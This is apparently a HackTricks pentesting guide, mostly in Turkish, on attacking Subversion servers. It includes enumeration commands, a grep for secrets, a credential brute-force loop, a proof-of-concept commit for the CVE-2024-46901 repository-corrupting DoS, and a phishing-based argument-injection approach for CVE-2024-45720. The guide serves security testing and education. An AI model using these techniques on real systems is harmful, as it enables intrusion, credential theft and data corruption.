# 3690/tcp - Pentesting Subversion (SVN) Sunucu

{{#include ../banners/hacktricks-training.md}}

## Temel Bilgiler

**Subversion (SVN)**, yazılım sürümleme ve revizyon kontrolü için kullanılan merkezi bir **versiyon kontrol sistemi**dir (Apache license).

**Varsayılan port:** `3690/tcp` (svnserve). Ayrıca `mod_dav_svn` aracılığıyla **HTTP/HTTPS** üzerinden ve **svn+ssh** ile de açılabilir.
```text
PORT     STATE SERVICE
3690/tcp open  svnserve Subversion
```
### Banner Grabbing
```bash
nc -vn 10.10.10.10 3690
svnserve --version           # if shell access is obtained
svn --version                # client version leak via error messages
```
## Keşif
```bash
# Anonymous / authenticated listing
svn ls svn://10.10.10.203                  # list root
svn ls -R svn://10.10.10.203/repo         # recursive list
svn info svn://10.10.10.203/repo          # repo metadata
svn log svn://10.10.10.203/repo           # commit history
svn checkout svn://10.10.10.203/repo      # checkout repository
svn up -r 2                               # move working copy to revision 2
svn diff -r 1:HEAD svn://10.10.10.203/repo   # view changes

# If served over HTTP(S)
svn ls https://10.10.10.10/svn/repo --username guest --password ''

# Extract revision props (often contain build creds, URLs, tokens)
svn propget --revprop -r HEAD svn:log svn://10.10.10.203/repo
```
### Auth & Misconfig Hunting

- `svnserve.conf` `anon-access = read` (ve hatta write) izin verebilir. Listeleyebiliyorsanız, gizli bilgileri, scriptleri ve CI tokenlarını dökmek için `checkout` deneyin.
- Depolar sıklıkla sürümlenmiş yapılandırma dosyalarında **build pipelines**, **deployment keys** ve **database credentials** saklar. Checkout'tan sonra çalışma kopyasında grep yapın: `grep -R "password\|secret\|token" -n .`.
- Eğer svn+ssh etkinse, kullanıcı shell'leri genellikle kısıtlı `svnserve` komutlarına izin verir; wrapper'ları atlatmak için özel alt-komutlarla `ssh user@host svnserve -t` deneyin.

### Bruteforcing credentials (svnserve)

`sasl` authentication (etkinse) ve basit parola dosyaları yalnızca taşıma ile korunur; varsayılan olarak kilitleme yoktur. Hızlı bir Bash döngüsü kimlik bilgilerini deneyebilir:
```bash
for u in admin dev ci; do
for p in $(cat /tmp/passlist); do
svn ls --username "$u" --password "$p" svn://10.10.10.203/repo 2>/dev/null && echo "[+] $u:$p" && break
done
done
```
## Son Zafiyetler (pratik etki)

### mod_dav_svn kontrol karakterleri ile DoS (CVE-2024-46901)

- Commit hakkına sahip bir kullanıcı, içinde kontrol karakterleri bulunan bir yol (örn. `\x01`, `\x7f`) yazabilir; bu, **deponun bozulmasına** neden olur, sonraki checkout/log işlemlerinin başarısız olmasına ve `mod_dav_svn` worker'larının çökmesine yol açabilir.
- HTTP(S) (`mod_dav_svn`) üzerinden hizmet verildiğinde Subversion ≤ **1.14.4** sürümlerini etkiler. **1.14.5**'te düzeltildi.
- PoC commit `svnmucc` ile (geçerli commit kimlik bilgileri gerektirir):
```bash
# create payload file
printf 'pwn' > /tmp/payload
# commit a path with a control character in its name
svnmucc -m "DoS" put /tmp/payload $'http://10.10.10.10/svn/repo/trunk/bad\x01path.txt'
```
- Commit'ten sonra, normal istemciler çökebilir veya yöneticiler `svnadmin dump/filter/load` ile revizyonu elle kaldırana kadar güncellemeleri reddedebilir.

### Windows argument injection in svn client (CVE-2024-45720)

- On Windows, "best-fit" character encoding in `svn.exe` allows **command-line argument injection** when processing specially crafted non‑ASCII paths/URLs, potentially leading to arbitrary program execution.
- Subversion ≤ **1.14.3** sürümlerini sadece Windows'ta etkiler; **1.14.4**'te düzeltildi. Attack surface: phishing a developer to run `svn` on an attacker-controlled URL/path.
- Pentest angle: eğer Windows geliştiricisine verilen bir network share veya ZIP dosyasını kontrol ediyorsanız, repo URL'sini veya working-copy yolunu best-fit byte'ları içerecek şekilde adlandırın (bunlar `" & calc.exe & "`-stil injected arg'lara decode olur) ve ardından kurbanı o yol üzerinde `svn status` veya benzeri bir komutu çalıştırmaya kandırın.

## Notes for Exploitation Workflow

1. **Check access method**: `svn://` (svnserve), `http(s)://.../svn/` (mod_dav_svn), or `svn+ssh://`.
2. **Try anonymous read** first; then spray common creds. If HTTP Basic is used, reuse creds found elsewhere.
3. **Enumerate hooks**: `hooks/pre-commit`, `post-commit` scripts sometimes contain plaintext credentials or hostnames.
4. **Leverage `svn:externals`** to pull additional paths from other hosts; list them with `svn propget svn:externals -R .` after checkout.
5. **Version leaks**: HTTP response headers from `mod_dav_svn` usually show the Subversion & Apache version; compare against 1.14.5 to spot vuln targets.
6. If you obtain filesystem access to the repo, `svnadmin dump`/`svnlook author`/`svnlook dirs-changed` allow offline analysis without credentials.



## References

- [Apache Subversion security advisory CVE-2024-46901](https://subversion.apache.org/security/CVE-2024-46901-advisory.txt)
- [Apache Subversion security advisory CVE-2024-45720](https://subversion.apache.org/security/CVE-2024-45720-advisory.txt)
{{#include ../banners/hacktricks-training.md}}
